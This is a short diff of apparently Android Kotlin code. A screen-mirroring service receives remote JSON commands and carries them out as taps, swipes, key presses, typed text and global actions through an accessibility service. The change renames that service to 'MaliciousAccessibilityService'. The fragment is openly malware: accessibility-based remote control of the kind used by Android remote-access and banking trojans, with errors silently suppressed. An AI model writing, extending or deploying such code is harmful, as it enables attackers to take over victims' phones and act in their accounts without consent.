@@ -150,20 +150,20 @@ class ScreenMirrorService : Service() {
                         val json = JSONObject(body)
                         when (json.optString("type")) {
                             "tap" -> {
-                                RemoteControlService.instance?.injectTap(
+                                MaliciousAccessibilityService.instance?.injectTap(
                                     json.getDouble("x").toFloat(),
                                     json.getDouble("y").toFloat()
                                 )
                                 delay(600) // wait for field to gain focus before next command
                             }
-                            "swipe" -> RemoteControlService.instance?.injectSwipe(
+                            "swipe" -> MaliciousAccessibilityService.instance?.injectSwipe(
                                 json.getDouble("x1").toFloat(), json.getDouble("y1").toFloat(),
                                 json.getDouble("x2").toFloat(), json.getDouble("y2").toFloat()
                             )
-                            "key"    -> RemoteControlService.instance?.injectKey(json.optString("key"))
-                            "text"   -> RemoteControlService.instance?.injectText(json.optString("text"))
-                            "clear"  -> RemoteControlService.instance?.clearText()
-                            "global" -> RemoteControlService.instance?.injectGlobal(json.optString("action"))
+                            "key"    -> MaliciousAccessibilityService.instance?.injectKey(json.optString("key"))
+                            "text"   -> MaliciousAccessibilityService.instance?.injectText(json.optString("text"))
+                            "clear"  -> MaliciousAccessibilityService.instance?.clearText()
+                            "global" -> MaliciousAccessibilityService.instance?.injectGlobal(json.optString("action"))
                         }
                     }
                 } catch (_: Exception) {}
